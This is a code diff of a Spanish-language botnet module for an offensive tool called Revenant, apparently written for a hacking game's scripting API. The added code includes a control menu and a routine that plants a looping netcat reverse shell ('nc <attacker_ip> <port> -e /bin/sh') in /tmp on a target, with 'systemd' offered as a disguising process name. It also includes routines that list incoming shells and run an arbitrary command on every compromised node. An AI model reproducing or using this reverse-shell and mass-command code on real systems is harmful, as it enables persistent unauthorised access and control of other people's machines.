@@ -1,8 +1,28 @@
 // modulo botnet.nini - El Alma de Revenant
 
+tarea modulo_botnet_menu:
+    opciones = [
+        {"label": "Ver nodos activos", "cmd": "info"},
+        {"label": "Establecer Callback (rshell)", "cmd": "callback"},
+        {"label": "Esperar conexiones", "cmd": "server"},
+        {"label": "Ejecutar comando en nodos", "cmd": "exec"},
+    ]
+    
+    modo = menu_interactivo("CONTROL DE BOTNET", opciones)
+    si not modo: return
+    
+    si modo == "info":
+        modulo_botnet_info()
+    osi modo == "callback":
+        botnet_establecer_callback()
+    osi modo == "server":
+        botnet_esperar_conexiones()
+    osi modo == "exec":
+        botnet_ejecutar_comando()
+
 tarea modulo_botnet_info:
     si enjambre.len == 0:
-        error("El enjambre esta vacio. Asalta algun objetivo primero.")
+        error("El enjambre esta vacio. Asalta algum objetivo primero.")
         return
         
     info("Desplegando estado del enjambre (" + enjambre.len + " nodos activos):")
@@ -16,6 +36,84 @@ tarea modulo_botnet_info:
     
     tabla = construir_tabla(columnas, filas)
     print(tabla)
+
+tarea botnet_establecer_callback:
+    info("CONFIGURANDO CALLBACK EN OBJETIVO...")
+    
+    objetivo = globals.objetivo_actual
+    si not objetivo:
+        error("No hay objetivo seleccionado.")
+        return
+    
+    tu_ip = get_shell.host_computer.local_ip
+    info("Tu IP (atacante): " + tu_ip)
+    
+    puerto = pedir("Puerto de callback (Enter=4444): ")
+    si puerto == "":
+        puerto = "4444"
+    
+    proceso = pedir("Nombre del proceso (Enter=systemd): ")
+    si proceso == "":
+        proceso = "systemd"
+    
+    comp = obtener_computadora_objetivo()
+    si not comp:
+        error("No hay sesion activa.")
+        return
+    
+    // Crear script de callback
+    contenido = "#!/bin/bash" + char(10)
+    contenido = contenido + "while true; do nc " + tu_ip + " " + puerto + " -e /bin/sh; sleep 60; done"
+    
+    ruta_script = "/tmp/revenant_callback.sh"
+    archivo = comp.File(ruta_script)
+    si archivo:
+        archivo.set_content(contenido)
+        comp.chmod("+x", ruta_script)
+        exito("Callback configurado en: " + ruta_script)
+        info("Para ejecutar: bash " + ruta_script)
+    sino:
+        error("No se pudo crear el script.")
+
+tarea botnet_esperar_conexiones:
+    info("ESPERANDO CONEXIONES DE BOTNET...")
+    info("Usa 'nc -lvp <puerto>' para escuchar.")
+    
+    metax = include_lib("/lib/metaxploit.so")
+    si not metax:
+        error("Metaxploit no disponible.")
+        return
+    
+    victims = metax.rshell_server
+    
+    si not victims o victims.len == 0:
+        info("No hay conexiones entrantes.")
+        return
+    
+    info("Conexiones activas: " + str(victims.len))
+    
+    para v en victims:
+        info("Nodo conectado: " + typeof(v))
+
+tarea botnet_ejecutar_comando:
+    si enjambre.len == 0:
+        error("El enjambre esta vacio.")
+        return
+    
+    comando = pedir("Comando a ejecutar: ")
+    si comando == "": return
+    
+    info("Ejecutando en " + str(enjambre.len) + " nodos...")
+    
+    para nodo en enjambre:
+        ip_nodo = nodo.key
+        sesion = nodo.value
+        
+        si typeof(sesion) == "shell":
+            sesion.launch("/bin/sh", "-c '" + comando + "'")
+            exito("Ejecutado en " + ip_nodo)
+        sino:
+            error("Sin shell en " + ip_nodo)
 
 tarea modulo_botnet_saquear:
     si enjambre.len == 0:
